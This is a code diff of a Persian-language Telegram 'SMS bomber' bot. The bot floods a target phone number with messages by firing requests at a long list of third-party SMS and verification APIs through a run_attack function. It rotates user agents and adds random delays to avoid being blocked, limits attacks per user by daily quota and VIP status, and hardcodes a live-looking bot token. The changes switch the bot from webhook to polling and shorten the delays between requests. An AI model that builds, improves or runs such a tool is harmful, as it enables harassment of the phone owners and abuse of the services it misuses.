@@ -11,15 +11,13 @@ import sqlite3
 import hashlib
 import random
 import json
-from flask import Flask, request
-from fake_useragent import UserAgent
 
 # ========== تنظیمات اصلی ==========
 TOKEN = "8485669315:AAEbEt7ZLNE-Jv6iPDNi76ubZgFe7zEZ5X0"
 ADMIN_IDS = [8226091292, 7620484201]  # ادمین‌های ثابت
 
 # ========== تعریف بات ==========
-bot = telebot.TeleBot(TOKEN, threaded=False)
+bot = telebot.TeleBot(TOKEN)
 
 # ========== کانال ربات ==========
 CREATOR_USERNAME = "@death_star_sms_bomber"
@@ -38,7 +36,7 @@ DAILY_LIMIT_NORMAL = 5
 DAILY_LIMIT_VIP = 20
 bot_active = True
 
-# ========== لیست کامل APIها (از فایل دوم) ==========
+# ========== لیست کامل APIها ==========
 APIS = [
     # ========== APIهای اصلی ==========
     {
@@ -923,21 +921,16 @@ APIS = [
 
 # ========== توابع کمکی برای APIها ==========
 def get_random_user_agent():
-    try:
-        ua = UserAgent()
-        return ua.random
-    except:
-        agents = [
-            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
-            "Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X) AppleWebKit/605.1.15",
-            "Mozilla/5.0 (Linux; Android 10; SM-G975F) AppleWebKit/537.36",
-            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36",
-            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15"
-        ]
-        return random.choice(agents)
+    agents = [
+        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
+        "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1",
+        "Mozilla/5.0 (Linux; Android 13; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
+        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
+        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15"
+    ]
+    return random.choice(agents)
 
 def prepare_api_data(api, phone):
-    """آماده‌سازی دیتا برای هر API"""
     phone_without_0 = phone[1:]
     phone_with_prefix = f"+98{phone_without_0}"
     
@@ -968,10 +961,8 @@ def prepare_api_data(api, phone):
     return replace_phone(data)
 
 def send_api_request(api, phone):
-    """ارسال درخواست به یک API خاص"""
     try:
-        # تاخیر تصادفی بین ریکوئست‌ها (جلوگیری از بلاک شدن)
-        time.sleep(random.uniform(0.5, 1.5))
+        time.sleep(random.uniform(0.3, 1.0))
         
         api_data = prepare_api_data(api, phone)
         method = api.get("method", "POST")
@@ -1002,40 +993,35 @@ def send_api_request(api, phone):
         
         return response.status_code in [200, 201, 202, 204]
     except Exception as e:
-        print(f"❌ خطا در API {api.get('name', 'نامشخص')}: {str(e)[:50]}")
         return False
 
 # ========== تابع حمله اصلی ==========
 def run_attack(phone, chat_id, msg_id):
-    """اجرای حمله با استفاده از همه APIها"""
-    
-    # باتج اول میگه که عملیات شروع شده
-    bot.edit_message_text(
-        f"🔥 در حال ارسال پیامک به {phone}...\n⏱ لطفاً صبر کنید...",
-        chat_id, 
-        msg_id
-    )
+    try:
+        bot.edit_message_text(
+            f"🔥 در حال ارسال پیامک به {phone}...\n⏱ لطفاً صبر کنید...",
+            chat_id, 
+            msg_id
+        )
+    except:
+        pass
     
     total_apis = len(APIS)
     success_count = 0
     
-    # ارسال به همه APIها
     for i, api in enumerate(APIS):
-        # اگه کاربر حمله رو متوقف کرده بود، break کن
         if chat_id in active_attacks and not active_attacks[chat_id]:
-            bot.edit_message_text(
-                "⛔ حمله توسط کاربر متوقف شد.",
-                chat_id, 
-                msg_id
-            )
-            del active_attacks[chat_id]
+            try:
+                bot.edit_message_text("⛔ حمله توسط کاربر متوقف شد.", chat_id, msg_id)
+            except:
+                pass
+            if chat_id in active_attacks:
+                del active_attacks[chat_id]
             return
         
-        # ارسال به API
         if send_api_request(api, phone):
             success_count += 1
         
-        # هر 10 تا API، یه آپدیت بده
         if (i + 1) % 10 == 0:
             try:
                 bot.edit_message_text(
@@ -1049,7 +1035,6 @@ def run_attack(phone, chat_id, msg_id):
             except:
                 pass
     
-    # نتیجه نهایی
     percent = int((success_count / total_apis) * 100) if total_apis > 0 else 0
     
     final_msg = f"""✅ **حمله با موفقیت انجام شد!**
@@ -1065,41 +1050,32 @@ def run_attack(phone, chat_id, msg_id):
     try:
         bot.edit_message_text(final_msg, chat_id, msg_id, parse_mode="Markdown")
     except:
-        bot.send_message(chat_id, final_msg, parse_mode="Markdown")
+        try:
+            bot.send_message(chat_id, final_msg, parse_mode="Markdown")
+        except:
+            pass
     finally:
         if chat_id in active_attacks:
             del active_attacks[chat_id]
 
 # ========== راه‌اندازی دیتابیس ==========
 def init_database():
-    """ایجاد جداول دیتابیس"""
-    print("🔄 در حال راه‌اندازی دیتابیس...")
-    
     try:
         conn = sqlite3.connect('bot_data.db')
         c = conn.cursor()
-        
-        c.execute('''CREATE TABLE IF NOT EXISTS admins
-                     (user_id INTEGER PRIMARY KEY)''')
-        c.execute('''CREATE TABLE IF NOT EXISTS vip_users
-                     (user_id INTEGER PRIMARY KEY)''')
-        c.execute('''CREATE TABLE IF NOT EXISTS user_daily
-                     (user_id INTEGER, date TEXT, count INTEGER, 
-                      PRIMARY KEY (user_id, date))''')
-        c.execute('''CREATE TABLE IF NOT EXISTS user_messages
-                     (user_id INTEGER PRIMARY KEY, count INTEGER)''')
-        c.execute('''CREATE TABLE IF NOT EXISTS user_last_use
-                     (user_id INTEGER PRIMARY KEY, last_use INTEGER)''')
+        c.execute('''CREATE TABLE IF NOT EXISTS admins (user_id INTEGER PRIMARY KEY)''')
+        c.execute('''CREATE TABLE IF NOT EXISTS vip_users (user_id INTEGER PRIMARY KEY)''')
+        c.execute('''CREATE TABLE IF NOT EXISTS user_daily (user_id INTEGER, date TEXT, count INTEGER, PRIMARY KEY (user_id, date))''')
+        c.execute('''CREATE TABLE IF NOT EXISTS user_messages (user_id INTEGER PRIMARY KEY, count INTEGER)''')
+        c.execute('''CREATE TABLE IF NOT EXISTS user_last_use (user_id INTEGER PRIMARY KEY, last_use INTEGER)''')
         
         for admin_id in ADMIN_IDS:
             c.execute("INSERT OR IGNORE INTO admins (user_id) VALUES (?)", (admin_id,))
         
         conn.commit()
         conn.close()
-        print("✅ دیتابیس راه‌اندازی شد")
         return True
-    except Exception as e:
-        print(f"❌ خطا در دیتابیس: {e}")
+    except:
         return False
 
 # ========== توابع دیتابیس ==========
@@ -1392,7 +1368,6 @@ def global_stats(m):
         
         bot.reply_to(m, msg, parse_mode="Markdown")
     except Exception as e:
-        print(f"❌ خطا در آمار: {e}")
         bot.reply_to(m, "❌ خطا در دریافت آمار.")
 
 # ========== حمله جدید ==========
@@ -1520,7 +1495,6 @@ def admin_stats(m):
 """
         bot.reply_to(m, msg, parse_mode="Markdown")
     except Exception as e:
-        print(f"❌ خطا: {e}")
         bot.reply_to(m, "❌ خطا در دریافت آمار.")
 
 # ========== لیست VIPها ==========
@@ -1695,49 +1669,17 @@ def fallback(m):
     
     bot.reply_to(m, "⚠️ لطفاً از دکمه‌های منو استفاده کن.")
 
-# ========== تنظیم Flask برای Webhook ==========
-app = Flask(__name__)
-
-# ========== تابع بیدار ماندن خودکار ==========
+# ========== تابع بیدار ماندن ==========
 def keep_alive():
     while True:
         try:
-            # پینگ به Google (به جای پینگ به خودت)
             requests.get("https://www.google.com", timeout=5)
-            print("✅ پینگ ارسال شد")
+            print("✅ پینگ ارسال شد - بات بیداره")
         except:
             pass
-        time.sleep(600)  # هر 10 دقیقه
+        time.sleep(60)
 
-threading.Thread(target=keep_alive, daemon=True).start()
-
-@app.route('/webhook', methods=['POST'])
-def webhook():
-    if request.headers.get('content-type') == 'application/json':
-        json_string = request.get_data().decode('utf-8')
-        update = telebot.types.Update.de_json(json_string)
-        bot.process_new_updates([update])
-        return 'OK', 200
-    return 'Forbidden', 403
-
-@app.route('/setwebhook')
-def set_webhook():
-    # آدرس رندرتو اینجا بذار
-    webhook_url = f"https://top-topye-1.onrender.com/webhook"
-    bot.remove_webhook()
-    time.sleep(1)
-    success = bot.set_webhook(url=webhook_url)
-    
-    if success:
-        return f"✅ Webhook set to {webhook_url}", 200
-    else:
-        return "❌ Failed to set webhook", 400
-
-@app.route('/')
-def index():
-    return f"{BOT_NAME} فعال است ✅\n👑 سازنده: {CREATOR_USERNAME}", 200
-
-# ========== اجرا ==========
+# ========== اجرای اصلی ==========
 if __name__ == "__main__":
     print("="*60)
     print(f"🚀 راه‌اندازی {BOT_NAME}")
@@ -1753,5 +1695,9 @@ if __name__ == "__main__":
     print("✅ سیستم ضد بلاک فعال شد")
     print("="*60)
     
-    port = int(os.environ.get('PORT', 10000))
-    app.run(host='0.0.0.0', port=port)
+    # استارت ترد بیدار ماندن
+    threading.Thread(target=keep_alive, daemon=True).start()
+    
+    # استارت بات به روش Polling
+    print("🔄 بات در حال اجرا به روش Polling...")
+    bot.infinity_polling(timeout=60, long_polling_timeout=30)
